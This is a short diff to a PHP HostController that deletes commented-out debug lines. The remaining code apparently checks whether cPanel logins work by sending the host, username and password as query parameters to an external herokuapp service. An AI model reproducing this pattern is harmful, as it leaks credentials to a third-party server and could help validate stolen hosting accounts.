@@ -301,11 +301,8 @@ class HostController extends Controller
         $password = $infos[2];
 
         $host = parse_url($host, PHP_URL_HOST);
-        // die(print_r($host));
         $urltoapi = "https://apichkup.herokuapp.com/chkcp.php?cp12=".$host."&login=$username&pass=".rawurlencode($password)."";
-        // die(print_r($urltoapi));
         $urltoapi2 = file_get_contents($urltoapi);
-        // die(print_r($urltoapi2));
 	    if (preg_match('#CP Work#', $urltoapi2)) {
             $msg = 'working';
         } else {
